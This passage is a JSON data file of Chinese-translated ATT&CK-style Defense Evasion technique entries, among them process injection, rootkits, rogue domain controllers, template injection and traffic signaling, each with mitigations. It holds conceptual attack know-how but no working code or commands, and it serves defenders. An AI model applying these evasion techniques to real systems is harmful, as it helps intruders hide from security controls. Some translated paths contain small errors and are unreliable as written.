                }
            ],
            [
                {
                    "type": "text",
                    "content": "路由器和防火墙等设备可以用于在可信网络和不可信网络之间创建边界。他们通过限制流量类型来执行组织策略，试图降低此类连接固有的风险，从而实现这一点。流量限制可以通过禁止IP地址、第4层协议端口或通过深度数据包检查来识别应用程序来实现。为了与网络的其他部分一起参与，这些设备可以直接寻址或透明，但它们的操作模式与对手在受到威胁时如何绕过它们无关。"
                }
            ],
            [
                {
                    "type": "text",
                    "content": "当对手控制这种边界设备时，他们可以绕过其策略执行，在没有阻碍的情况下，将通常禁止的流量通过两个分离网络之间的信任边界。通过在设备上获得足够的权限，对手可以重新配置设备以允许他们想要的流量，从而进一步实现目标，如通过多跳代理进行命令和控制，或通过流量复制进行数据过滤。敌人也可能以负责网络分割的内部设备为目标，并与内部代理一起滥用这些设备来实现相同的目标。在边界设备将两个独立的组织分开的情况下，对手也可以促进横向移动到新的受害者环境中。"
                }
            ]
        ],
        "mitigations": [
            {
                "id": "M1043",
                "name": "凭据访问保护",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "一些嵌入式网络设备能够以纯文本或加密格式存储本地帐户的密码。根据供应商的建议，确保在可用的情况下始终加密本地密码。"
                        }
                    ]
                ]
            },
            {
                "id": "M1037",
                "name": "过滤网络流量",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "在识别出用于桥接网络边界的受损网络设备后，使用路径中未受影响的网络设备（如未受损的防火墙或路由器）阻止恶意数据包。继续监测其他活动，并确保区块确实有效。"
                        }
                    ]
                ]
            },
            {
                "id": "M1032",
                "name": "多因素身份验证",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "对用户和特权帐户使用多因素身份验证。大多数嵌入式网络设备支持TACACS+和/或RADIUS。遵循供应商规定的强化访问控制的最佳实践。"
                        }
                    ]
                ]
            },
            {
                "id": "M1027",
                "name": "密码策略",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "创建密码策略时，请参阅NIST指南。"
                        }
                    ]
                ]
            },
            {
                "id": "M1026",
                "name": "特权帐户管理",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "按照最低权限原则，将管理员帐户限制为尽可能少的个人。防止管理员帐户和特权帐户系统之间的凭据重叠，特别是在网络和非网络平台（如服务器或端点）之间。"
                        }
                    ]
                ]
            }
        ]
    },
    {
        "id": "T1027",
        "name": "Obfuscated Files or Information",
        "tactics": [
            {
                "id": "TA0005",
                "name": "Defense Evasion"
            }
        ],
        "subs": [
            {
                "id": "T1027.001",
                "name": "Binary Padding"
            },
            {
                "id": "T1027.002",
                "name": "Software Packing"
            },
            {
                "id": "T1027.003",
                "name": "Steganography"
            },
            {
                "id": "T1027.004",
                "name": "Compile After Delivery"
            },
            {
                "id": "T1027.005",
                "name": "Indicator Removal from Tools"
            },
            {
                "id": "T1027.006",
                "name": "HTML Smuggling"
            },
            {
                "id": "T1027.007",
                "name": "Dynamic API Resolution"
            },
            {
                "id": "T1027.008",
                "name": "Stripped Payloads"
            },
            {
                "id": "T1027.009",
                "name": "Embedded Payloads"
            },
            {
                "id": "T1027.010",
                "name": "Command Obfuscation"
            },
            {
                "id": "T1027.011",
                "name": "Fileless Storage"
            },
            {
                "id": "T1027.012",
                "name": "LNK Icon Smuggling"
            }
        ],
        "version": "1.5",
        "description": [
            [
                {
                    "type": "text",
                    "content": "对手可能试图通过加密、编码或以其他方式混淆系统上或传输中的可执行文件或文件内容，使其难以发现或分析。这是一种常见的行为，可以在不同的平台和网络上使用以躲避防御。"
                }
            ],
            [
                {
                    "type": "text",
                    "content": "为了避免检测，可以对有效负载进行压缩、存档或加密。这些有效载荷可以在初始接入期间或以后使用，以减轻检测。有时，可能需要用户的操作来打开和解密文件或信息以供用户执行。用户还可能被要求输入密码以打开由对手提供的受密码保护的压缩/加密文件。敌人也可能使用压缩或存档的脚本，如JavaScript。"
                }
            ],
            [
                {
                    "type": "text",
                    "content": "部分文件也可以被编码以隐藏纯文本字符串，否则这些字符串将有助于防御者进行发现。有效负载也可能被拆分为单独的、看似良性的文件，这些文件在重新组装时只会显示恶意功能。"
                }
            ],
            [
                {
                    "type": "text",
                    "content": "敌人也可能滥用命令混淆来模糊从有效载荷或直接通过命令和脚本解释器执行的命令。环境变量、别名、字符和其他特定于平台/语言的语义可用于规避基于签名的检测和应用程序控制机制。"
                }
            ]
        ],
        "mitigations": [
            {
                "id": "M1049",
                "name": "防病毒/反恶意软件",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "防病毒可以用于自动检测和隔离可疑文件。考虑在Windows 10+上使用反恶意软件扫描接口（AMSI）来分析处理/解释后的命令。"
                        }
                    ]
                ]
            },
            {
                "id": "M1047",
                "name": "审计",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "考虑定期检查常见的无文件存储位置（如注册表或WMI存储库），以潜在地识别异常和恶意数据。"
                        }
                    ]
                ]
            },
            {
                "id": "M1040",
                "name": "端点上的行为预防",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "在Windows 10+上，启用减少攻击面（ASR）规则，以防止执行可能混淆的有效载荷。"
                        }
                    ]
                ]
            },
            {
                "id": "M1017",
                "name": "用户培训",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "确保存在有限数量的软件部署系统入口点，并对允许和启用新部署的软件所需的入口点进行限制访问。"
                        }
                    ]
                ]
            }
        ]
    },
    {
        "id": "T1647",
        "name": "Plist File Modification",
        "tactics": [
            {
                "id": "TA0005",
                "name": "Defense Evasion"
            }
        ],
        "subs": [],
        "version": "1.0",
        "description": [
            [
                {
                    "type": "text",
                    "content": "敌人可能会修改属性列表文件（plist文件）以启用其他恶意活动，同时也可能规避和绕过系统防御。macOS应用程序使用plist文件，如"
                },
                {
                    "type": "code",
                    "content": "info.plist"
                },
                {
                    "type": "text",
                    "content": "文件，来存储属性和配置设置，这些设置会通知操作系统如何在运行时处理应用程序。Plist文件是基于Apple的Core Foundation DTD以XML格式格式化的键值对中的结构化元数据。Plist文件可以保存为文本或二进制格式。"
                }
            ],
            [
                {
                    "type": "text",
                    "content": "敌人可以修改plist文件中的键值对来影响系统行为，例如隐藏应用程序的执行（即隐藏窗口）或运行其他持久性命令（例如：启动代理/启动守护程序或重新打开的应用程序）。"
                }
            ],
            [
                {
                    "type": "text",
                    "content": "例如，对手可以将恶意应用程序路径添加到"
                },
                {
                    "type": "code",
                    "content": "~/Library/Preferences.com/apple.dock.plist"
                },
                {
                    "type": "text",
                    "content": "文件中，该文件控制dock中出现的应用程序。对手还可以修改应用程序"
                },
                {
                    "type": "code",
                    "content": "info.plist"
                },
                {
                    "type": "text",
                    "content": "文件中的"
                },
                {
                    "type": "code",
                    "content": "LSUIElement"
                },
                {
                    "type": "text",
                    "content": "键，以便在后台运行应用程序。敌人还可以插入键值对来插入环境变量，如＜code＞LSEnvironment＜/code＞，以通过动态链接劫持实现持久性。"
                }
            ]
        ],
        "mitigations": [
            {
                "id": "M1013",
                "name": "应用程序开发人员指南",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "确保应用程序使用苹果的开发者指南，该指南支持强化运行时。"
                        }
                    ]
                ]
            }
        ]
    },
    {
        "id": "T1542",
        "name": "Pre-OS Boot",
        "tactics": [
            {
                "id": "TA0005",
                "name": "Defense Evasion"
            },
            {
                "id": "TA0003",
                "name": "Persistence"
            }
        ],
        "subs": [
            {
                "id": "T1542.001",
                "name": "System Firmware"
            },
            {
                "id": "T1542.002",
                "name": "Component Firmware"
            },
            {
                "id": "T1542.003",
                "name": "Bootkit"
            },
            {
                "id": "T1542.004",
                "name": "ROMMONkit"
            },
            {
                "id": "T1542.005",
                "name": "TFTP Boot"
            }
        ],
        "version": "1.1",
        "description": [
            [
                {
                    "type": "text",
                    "content": "敌人可能会滥用操作系统引导前机制，将其作为在系统上建立持久性的一种方式。在计算机的引导过程中，固件和各种启动服务在操作系统之前加载。这些程序在操作系统取得控制之前控制执行流程。"
                }
            ],
            [
                {
                    "type": "text",
                    "content": "敌人可能会覆盖引导驱动程序或固件（如BIOS（基本输入/输出系统）和统一可扩展固件接口（UEFI））中的数据，以在操作系统下一层的系统上持久存在。这可能特别难以检测，因为基于主机软件的防御不会检测到该级别的恶意软件。"
                }
            ]
        ],
        "mitigations": [
            {
                "id": "M1046",
                "name": "引导完整性",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "使用受信任的平台模块技术和安全或受信任的引导过程来防止系统完整性受到损害。检查现有BIOS或EFI的完整性，以确定其是否容易被修改。"
                        }
                    ]
                ]
            },
            {
                "id": "M1026",
                "name": "特权帐户管理",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "确保拥有适当的权限，以帮助防止对手访问执行这些操作所需的特权帐户"
                        }
                    ]
                ]
            },
            {
                "id": "M1051",
                "name": "更新软件",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "根据需要修补BIOS和EFI。"
                        }
                    ]
                ]
            }
        ]
    },
    {
        "id": "T1055",
        "name": "Process Injection",
        "tactics": [
            {
                "id": "TA0005",
                "name": "Defense Evasion"
            },
            {
                "id": "TA0004",
                "name": "Privilege Escalation"
            }
        ],
        "subs": [
            {
                "id": "T1055.001",
                "name": "Dynamic-link Library Injection"
            },
            {
                "id": "T1055.002",
                "name": "Portable Executable Injection"
            },
            {
                "id": "T1055.003",
                "name": "Thread Execution Hijacking"
            },
            {
                "id": "T1055.004",
                "name": "Asynchronous Procedure Call"
            },
            {
                "id": "T1055.005",
                "name": "Thread Local Storage"
            },
            {
                "id": "T1055.008",
                "name": "Ptrace System Calls"
            },
            {
                "id": "T1055.009",
                "name": "Proc Memory"
            },
            {
                "id": "T1055.011",
                "name": "Extra Window Memory Injection"
            },
            {
                "id": "T1055.012",
                "name": "Process Hollowing"
            },
            {
                "id": "T1055.013",
                "name": "Process Doppelgänging"
            },
            {
                "id": "T1055.014",
                "name": "VDSO Hijacking"
            },
            {
                "id": "T1055.015",
                "name": "ListPlanting"
            }
        ],
        "version": "1.3",
        "description": [
            [
                {
                    "type": "text",
                    "content": "敌人可能会将代码注入进程，以逃避基于进程的防御，并可能提升特权。进程注入是一种在单独的活动进程的地址空间中执行任意代码的方法。在另一个进程的上下文中运行代码可以允许访问该进程的内存、系统/网络资源，以及可能提升的权限。通过进程注入执行也可能逃避安全产品的检测，因为在合法进程下执行是被掩盖的。"
                }
            ],
            [
                {
                    "type": "text",
                    "content": "有许多不同的方法可以将代码注入进程，其中许多方法滥用合法功能。这些实现适用于每个主要的操作系统，但通常是特定于平台的。"
                }
            ],
            [
                {
                    "type": "text",
                    "content": "更复杂的样本可以利用命名管道或其他进程间通信（IPC）机制作为通信信道，执行多个进程注入以分割模块并进一步逃避检测。"
                }
            ]
        ],
        "mitigations": [
            {
                "id": "M1040",
                "name": "端点上的行为预防",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "一些端点安全解决方案可以配置为基于注入过程中发生的常见行为序列来阻止某些类型的过程注入。例如，在Windows 10上，减少攻击面（ASR）规则可能会阻止Office应用程序进行代码注入。"
                        }
                    ]
                ]
            },
            {
                "id": "M1026",
                "name": "特权帐户管理",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "利用Yama（例如：/proc/sys/kernel/Yama/ptrace_scope），通过仅将ptrace的使用限制为特权用户，来减轻基于ptrace进程的注入。其他缓解控制包括部署提供高级访问控制和进程限制的安全内核模块，如SELinux、grsecurity和AppArmor。"
                        }
                    ]
                ]
            }
        ]
    },
    {
        "id": "T1620",
        "name": "Reflective Code Loading",
        "tactics": [
            {
                "id": "TA0005",
                "name": "Defense Evasion"
            }
        ],
        "subs": [],
        "version": "1.1",
        "description": [
            [
                {
                    "type": "text",
                    "content": "敌人可能会将代码反射性地加载到进程中，以隐藏恶意有效载荷的执行。反射加载包括直接在进程的内存中分配然后执行有效负载，反之亦然，创建由磁盘上的文件路径支持的线程或进程。反射加载的有效载荷可能是编译的二进制文件、匿名文件（仅存在于RAM中），或者只是对无文件可执行代码的冷落（例如：与位置无关的外壳代码）。"
                }
            ],
            [
                {
                    "type": "text",
                    "content": "反射代码注入与进程注入非常相似，只是“注入”将代码加载到进程自己的内存中，而不是单独进程的内存中。反射加载可以避免基于进程的检测，因为任意代码的执行可以在合法或其他良性进程中被屏蔽。将有效载荷直接反映加载到存储器中也可以避免在磁盘上创建文件或其他工件，同时也使恶意软件能够在执行之前对这些有效载荷进行加密（或以其他方式混淆）。"
                }
            ]
        ],
        "mitigations": [
            {
                "type": "text",
                "content": "这种类型的攻击技术无法通过预防性控制轻易缓解，因为它是基于对系统功能的滥用。"
            }
        ]
    },
    {
        "id": "T1207",
        "name": "Rogue Domain Controller",
        "tactics": [
            {
                "id": "TA0005",
                "name": "Defense Evasion"
            }
        ],
        "subs": [],
        "version": "2.1",
        "description": [
            [
                {
                    "type": "text",
                    "content": "敌人可能会注册流氓域控制器以启用对Active Directory数据的操作。DCShadow可用于创建流氓域控制器（DC）。DCShadow是一种通过注册（或重用非活动注册）和模拟DC行为来操作Active Directory（AD）数据（包括对象和模式）的方法。一旦注册，流氓DC就可以将更改注入并复制到任何域对象的AD基础结构中，包括凭据和密钥。"
                }
            ],
            [
                {
                    "type": "text",
                    "content": "注册流氓DC涉及在AD架构的配置分区中创建新服务器和nTDSDSA对象，这需要管理员权限（域或DC本地权限）或KRBTGT哈希。"
                }
            ],
            [
                {
                    "type": "text",
                    "content": "该技术可以绕过系统日志记录和安全监视器，如安全信息和事件管理（SIEM）产品（因为对流氓DC采取的行动可能不会报告给这些传感器）。该技术还可以用于改变和删除复制和其他相关联的元数据，以阻碍取证分析。对手也可以利用该技术来执行SID历史注入和/或操纵AD对象（例如帐户、访问控制列表、模式）以建立持久性的后门。"
                }
            ]
        ],
        "mitigations": [
            {
                "type": "text",
                "content": "这种类型的攻击技术无法通过预防性控制轻易缓解，因为它是基于对系统功能的滥用。"
            }
        ]
    },
    {
        "id": "T1014",
        "name": "Rootkit",
        "tactics": [
            {
                "id": "TA0005",
                "name": "Defense Evasion"
            }
        ],
        "subs": [],
        "version": "1.1",
        "description": [
            [
                {
                    "type": "text",
                    "content": "敌人可能会使用rootkit来隐藏程序、文件、网络连接、服务、驱动程序和其他系统组件的存在。Rootkit是通过拦截/挂钩和修改提供系统信息的操作系统API调用来隐藏恶意软件存在的程序。"
                }
            ],
            [
                {
                    "type": "text",
                    "content": "rootkit或rootkit启用功能可以位于操作系统或更低版本的用户或内核级别，以包括系统管理程序、主引导记录或系统固件。Rootkit已被用于Windows、Linux和Mac OS X系统。"
                }
            ]
        ],
        "mitigations": [
            {
                "type": "text",
                "content": "这种类型的攻击技术无法通过预防性控制轻易缓解，因为它是基于对系统功能的滥用。"
            }
        ]
    },
    {
        "id": "T1553",
        "name": "Subvert Trust Controls",
        "tactics": [
            {
                "id": "TA0005",
                "name": "Defense Evasion"
            }
        ],
        "subs": [
            {
                "id": "T1553.001",
                "name": "Gatekeeper Bypass"
            },
            {
                "id": "T1553.002",
                "name": "Code Signing"
            },
            {
                "id": "T1553.003",
                "name": "SIP and Trust Provider Hijacking"
            },
            {
                "id": "T1553.004",
                "name": "Install Root Certificate"
            },
            {
                "id": "T1553.005",
                "name": "Mark-of-the-Web Bypass"
            },
            {
                "id": "T1553.006",
                "name": "Code Signing Policy Modification"
            }
        ],
        "version": "1.1",
        "description": [
            [
                {
                    "type": "text",
                    "content": "敌人可能会破坏安全控制，这些控制会警告用户不受信任的活动或阻止不受信任程序的执行。操作系统和安全产品可能包含将程序或网站识别为具有某种程度的信任的机制。此类功能的示例包括：因为程序由有效的代码签名证书签名而允许运行的程序，因为程序具有从Internet下载的属性集而提示用户发出警告的程序，或者得到您将要连接到不受信任的网站的指示。"
                }
            ],
            [
                {
                    "type": "text",
                    "content": "敌人可能试图破坏这些信任机制。对手使用的方法将取决于他们试图颠覆的具体机制。敌人可能会进行文件和目录权限修改或修改注册表，以支持破坏这些控制。敌人还可能创建或窃取代码签名证书，以获得对目标系统的信任。"
                }
            ]
        ],
        "mitigations": [
            {
                "id": "M1038",
                "name": "执行预防",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "系统设置可以阻止未通过Apple Store（或其他合法存储库）下载的应用程序运行，这有助于缓解其中的一些问题。还启用应用程序控制解决方案，如AppLocker和/或Device Guard，以阻止恶意内容的加载。"
                        }
                    ]
                ]
            },
            {
                "id": "M1028",
                "name": "操作系统配置",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "Windows组策略可用于管理根证书，"
                        },
                        {
                            "type": "code",
                            "content": "HKLM\\SOFTWARE\\Policies\\Microsoft\\SystemCertificates\\root\\ProtectedRoots"
                        },
                        {
                            "type": "text",
                            "content": "的"
                        },
                        {
                            "type": "code",
                            "content": "标志"
                        },
                        {
                            "type": "text",
                            "content": "值可设置为1，以防止非管理员用户将根安装到自己的HKCU证书存储中。"
                        }
                    ]
                ]
            },
            {
                "id": "M1024",
                "name": "限制注册表权限",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "确保为注册表配置单元设置了正确的权限，以防止用户修改与SIP和信任提供程序组件相关的密钥。如果不防止对注册表项的恶意修改，组件仍可能被劫持为磁盘上已经存在的适当功能。"
                        }
                    ]
                ]
            },
            {
                "id": "M1054",
                "name": "软件配置",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "HTTP公钥锁定（HPKP）是一种在中间情况下减轻潜在对手的方法，在这种情况下，对手使用错误颁发或欺诈的证书，通过强制使用预期的证书来拦截加密通信。"
                        }
                    ]
                ]
            }
        ]
    },
    {
        "id": "T1218",
        "name": "System Binary Proxy Execution",
        "tactics": [
            {
                "id": "TA0005",
                "name": "Defense Evasion"
            }
        ],
        "subs": [
            {
                "id": "T1218.001",
                "name": "Compiled HTML File"
            },
            {
                "id": "T1218.002",
                "name": "Control Panel"
            },
            {
                "id": "T1218.003",
                "name": "CMSTP"
            },
            {
                "id": "T1218.004",
                "name": "InstallUtil"
            },
            {
                "id": "T1218.005",
                "name": "Mshta"
            },
            {
                "id": "T1218.007",
                "name": "Msiexec"
            },
            {
                "id": "T1218.008",
                "name": "Odbcconf"
            },
            {
                "id": "T1218.009",
                "name": "Regsvcs/Regasm"
            },
            {
                "id": "T1218.010",
                "name": "Regsvr32"
            },
            {
                "id": "T1218.011",
                "name": "Rundll32"
            },
            {
                "id": "T1218.012",
                "name": "Verclsid"
            },
            {
                "id": "T1218.013",
                "name": "Mavinject"
            },
            {
                "id": "T1218.014",
                "name": "MMC"
            }
        ],
        "version": "3.0",
        "description": [
            [
                {
                    "type": "text",
                    "content": "对手可以通过使用签名的或以其他方式受信任的二进制文件代理恶意内容的执行，从而绕过基于进程和/或签名的防御。这种技术中使用的二进制文件通常是Microsoft签名的文件，这表明它们要么是从Microsoft下载的，要么已经是操作系统中的本机文件。使用可信数字证书签名的二进制文件通常可以在受数字签名验证保护的Windows系统上执行。Windows安装中默认的几个Microsoft签名二进制文件可用于代理其他文件或命令的执行。"
                }
            ],
            [
                {
                    "type": "text",
                    "content": "同样，在Linux系统上，对手可能会滥用受信任的二进制文件，如"
                },
                {
                    "type": "code",
                    "content": "split"
                },
                {
                    "type": "text",
                    "content": "来代理恶意命令的执行。"
                }
            ]
        ],
        "mitigations": [
            {
                "id": "M1042",
                "name": "禁用或删除功能或程序",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "在给定的环境中，许多本机二进制文件可能不是必需的。"
                        }
                    ]
                ]
            },
            {
                "id": "M1038",
                "name": "执行预防",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "考虑使用应用程序控制来防止执行容易被滥用的二进制文件，而这些二进制文件对于给定的系统或网络来说是不需要的。"
                        }
                    ]
                ]
            },
            {
                "id": "M1050",
                "name": "利用漏洞保护",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "Microsoft的增强型缓解体验工具包（EMET）攻击面减少（ASR）功能可用于阻止使用可信二进制文件绕过应用程序控制的方法。"
                        }
                    ]
                ]
            },
            {
                "id": "M1026",
                "name": "特权帐户管理",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "将特别易受攻击的二进制文件的执行限制在需要使用它的特权帐户或组，以减少恶意使用的机会。"
                        }
                    ]
                ]
            }
        ]
    },
    {
        "id": "T1216",
        "name": "System Script Proxy Execution",
        "tactics": [
            {
                "id": "TA0005",
                "name": "Defense Evasion"
            }
        ],
        "subs": [
            {
                "id": "T1216.001",
                "name": "PubPrn"
            }
        ],
        "version": "2.0",
        "description": [
            [
                {
                    "type": "text",
                    "content": "对手可能会使用受信任的脚本（通常使用证书签名）来代理恶意文件的执行。从Microsoft下载的或在Windows安装中默认的几个Microsoft签名脚本可以用于代理其他文件的执行。这种行为可能会被对手滥用，以执行恶意文件，从而绕过系统上的应用程序控制和签名验证。"
                }
            ]
        ],
        "mitigations": [
            {
                "id": "M1038",
                "name": "执行预防",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "在给定的环境中，某些可用于执行其他程序的签名脚本可能不是必需的。如果给定的系统或网络不需要这些脚本，请使用配置为阻止这些脚本执行的应用程序控制，以防止对手可能滥用这些脚本。"
                        }
                    ]
                ]
            }
        ]
    },
    {
        "id": "T1221",
        "name": "Template Injection",
        "tactics": [
            {
                "id": "TA0005",
                "name": "Defense Evasion"
            }
        ],
        "subs": [],
        "version": "1.3",
        "description": [
            [
                {
                    "type": "text",
                    "content": "对手可能会在用户文档模板中创建或修改引用，以隐藏恶意代码或强制进行身份验证尝试。例如，Microsoft的Office Open XML（OOXML）规范为Office文档定义了一种基于XML的格式（.docx、xlsx、.pptx），以取代旧的二进制格式（.doc、.xls、.ppt）。OOXML文件被打包在一起，ZIP档案由各种XML文件（称为部分）组成，包含共同定义文档呈现方式的属性。"
                }
            ],
            [
                {
                    "type": "text",
                    "content": "部件内的属性可以引用通过在线URL访问的共享公共资源。例如，模板属性可以引用一个文件，该文件用作预格式化的文档蓝图，在加载文档时提取。"
                }
            ],
            [
                {
                    "type": "text",
                    "content": "敌人可能会滥用这些模板，最初隐藏要通过用户文档执行的恶意代码。注入到文档中的模板引用可能使恶意有效载荷能够在加载文档时被提取和执行。这些文档可以通过其他技术（如网络钓鱼和/或Taint共享内容）传递，并且可以逃避静态检测，因为在获取恶意有效载荷之前不存在典型的指示符（VBA宏、脚本等）。在野外已经看到了使用模板注入来加载包含漏洞的恶意代码的例子。"
                }
            ],
            [
                {
                    "type": "text",
                    "content": "敌人还可以修改.rtf文件中的"
                },
                {
                    "type": "code",
                    "content": "*\\template"
                },
                {
                    "type": "text",
                    "content": "控制字，以类似地隐藏然后下载恶意代码。此合法控制字值旨在作为打开.rtf文件时检索和加载的模板文件资源的文件目标。然而，对手可能会更改现有.rtf文件的字节，以插入模板控制字字段，从而包括恶意有效载荷的URL资源。"
                }
            ],
            [
                {
                    "type": "text",
                    "content": "该技术还可以通过注入SMB/HTTPS（或其他凭证提示）URL并触发身份验证尝试来启用强制身份验证。"
                }
            ]
        ],
        "mitigations": [
            {
                "id": "M1049",
                "name": "防病毒/反恶意软件",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "可以使用网络/主机入侵预防系统、防病毒和引爆室来防止文档获取和/或执行恶意有效载荷。"
                        }
                    ]
                ]
            },
            {
                "id": "M1042",
                "name": "禁用或删除功能或程序",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "请考虑禁用Microsoft Office宏/活动内容，以防止在文档中执行恶意有效载荷，尽管此设置可能无法减少此技术的强制身份验证使用。"
                        }
                    ]
                ]
            },
            {
                "id": "M1031",
                "name": "网络入侵防护",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "可以使用网络/主机入侵预防系统、防病毒和引爆室来防止文档获取和/或执行恶意有效载荷。"
                        }
                    ]
                ]
            },
            {
                "id": "M1017",
                "name": "用户培训",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "培训用户识别可用于传递恶意文档的社会工程技术和鱼叉式网络钓鱼电子邮件。"
                        }
                    ]
                ]
            }
        ]
    },
    {
        "id": "T1205",
        "name": "Traffic Signaling",
        "tactics": [
            {
                "id": "TA0005",
                "name": "Defense Evasion"
            },
            {
                "id": "TA0003",
                "name": "Persistence"
            },
            {
                "id": "TA0011",
                "name": "Command and Control"
            }
        ],
        "subs": [
            {
                "id": "T1205.001",
                "name": "Port Knocking"
            },
            {
                "id": "T1205.002",
                "name": "Socket Filters"
            }
        ],
        "version": "2.4",
        "description": [
            [
                {
                    "type": "text",
                    "content": "敌人可能使用流量信号来隐藏打开的端口或用于持久性或命令和控制的其他恶意功能。流量信号涉及使用必须发送到系统以触发特殊响应的神奇值或序列，例如打开关闭的端口或执行恶意任务。这可以采取在对手可以用于指挥和控制的端口打开之前发送一系列具有特定特征的数据包的形式。通常，这一系列数据包包括尝试连接到预定义的封闭端口序列（即端口敲击），但可能涉及不寻常的标志、特定字符串或其他独特特征。序列完成后，打开端口可以由基于主机的防火墙完成，但也可以由自定义软件实现。"
                }
            ],
            [
                {
                    "type": "text",
                    "content": "敌人也可能与已经打开的端口通信，但在该端口上侦听的服务只有在传递了适当的魔法值时才会响应命令或触发其他恶意功能。"
                }
            ],
            [
                {
                    "type": "text",
                    "content": "可以通过不同的方法来进行对信号分组的观察以触发通信。最初由Cd00r实现的一种方法是使用libpcap库来探查有问题的数据包。另一种方法利用原始套接字，使恶意软件能够使用已经打开供其他程序使用的端口。"
                }
            ],
            [
                {
                    "type": "text",
                    "content": "在网络设备上，对手可能会使用特制的数据包为设备提供的标准服务（如telnet）启用网络设备身份验证。这种信令还可以用于打开诸如telnet之类的封闭服务端口，或者触发对设备上植入的恶意软件的模块修改，添加、删除或改变恶意功能。敌人可能会使用特制的数据包尝试连接到一个或多个（打开或关闭）端口，但也可能尝试连接到同一端口上的路由器接口、广播和网络地址IP，以实现其目标。为了在嵌入式设备上实现这种流量信号，由于体系结构的整体性，对手必须首先实现并利用补丁系统映像。"
                }
            ],
            [
                {
                    "type": "text",
                    "content": "敌人也可以使用局域网唤醒功能来打开关闭电源的系统。局域网唤醒是一种硬件功能，可以通过向断电的系统发送魔法包来打开或唤醒断电的系统。一旦系统打开电源，它可能会成为横向移动的目标。"
                }
            ]
        ],
        "mitigations": [
            {
                "id": "M1042",
                "name": "禁用或删除功能或程序",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "如果环境中不需要，请禁用局域网唤醒。"
                        }
                    ]
                ]
            },
            {
                "id": "M1037",
                "name": "过滤网络流量",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "根据该技术的实现方式，可以通过使用有状态防火墙来实现对该技术某些变体的缓解。"
                        }
                    ]
                ]
            }
        ]
    },
    {
        "id": "T1127",
        "name": "Trusted Developer Utilities Proxy Execution",
        "tactics": [
            {
                "id": "TA0005",
                "name": "Defense Evasion"
            }
        ],
        "subs": [
            {
                "id": "T1127.001",
                "name": "MSBuild"
            }
        ],
        "version": "1.2",
        "description": [
            [
                {
                    "type": "text",
                    "content": "敌人可能会利用受信任的开发人员实用程序来代理恶意有效负载的执行。有许多实用程序用于与软件开发相关的任务，可用于执行各种形式的代码，以帮助开发、调试和逆向工程。这些实用程序通常可以使用合法证书进行签名，这些证书允许它们在系统上执行，并通过有效绕过应用程序控制解决方案的可信进程代理恶意代码的执行。"
                }
            ]
        ],
        "mitigations": [
            {
                "id": "M1042",
                "name": "禁用或删除功能或程序",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "特定的开发人员实用程序在给定的环境中可能不是必需的，如果不使用，则应删除。"
                        }
                    ]
                ]
            },
            {
                "id": "M1038",
                "name": "执行预防",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "如果不需要，应阻止或限制某些开发人员实用程序。"
                        }
                    ]
                ]
            }
        ]
    },
    {
        "id": "T1535",
        "name": "Unused/Unsupported Cloud Regions",
        "tactics": [
            {
                "id": "TA0005",
                "name": "Defense Evasion"
            }
        ],
        "subs": [],
        "version": "1.1",
        "description": [
            [
                {
                    "type": "text",
                    "content": "对手可能会在未使用的地理服务区域中创建云实例，以逃避检测。访问权限通常是通过泄露用于管理云基础设施的帐户获得的。"
                }
            ],
            [
                {
                    "type": "text",
                    "content": "云服务提供商通常在世界各地提供基础设施，以提高性能、提供冗余，并允许客户满足法规遵从性要求。通常，客户只会使用可用区域的一个子集，而可能不会主动监控其他区域。如果对手在未使用的区域创建资源，他们可能能够在未被发现的情况下进行行动。"
                }
            ],
            [
                {
                    "type": "text",
                    "content": "这种行为的变体利用了云区域之间功能的差异。对手可以利用不支持高级检测服务的区域来避免对其活动的检测。"
                }
            ],
            [
                {
                    "type": "text",
                    "content": "对手使用未使用的AWS区域的一个例子是通过资源劫持来挖掘加密货币，随着时间的推移，根据使用的处理能力，这可能会让组织损失大量资金。"
                }
            ]
        ],
        "mitigations": [
            {
                "id": "M1054",
                "name": "软件配置",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "云服务提供商可以允许客户停用未使用的区域。"
                        }
                    ]
                ]
            }
        ]
    },
    {
        "id": "T1550",
        "name": "Use Alternate Authentication Material",
        "tactics": [
            {
                "id": "TA0005",
                "name": "Defense Evasion"
            },
            {
                "id": "TA0008",
                "name": "Lateral Movement"
            }
        ],
        "subs": [
            {
                "id": "T1550.001",
                "name": "Application Access Token"
            },
            {
                "id": "T1550.002",
                "name": "Pass the Hash"
            },
            {
                "id": "T1550.003",
                "name": "Pass the Ticket"
            },
            {
                "id": "T1550.004",
                "name": "Web Session Cookie"
            }
        ],
        "version": "1.2",
        "description": [
            [
                {
                    "type": "text",
                    "content": "对手可以使用替代的身份验证材料，如密码哈希、Kerberos票证和应用程序访问令牌，以便在环境中横向移动并绕过正常的系统访问控制。"
                }
            ],
            [
                {
                    "type": "text",
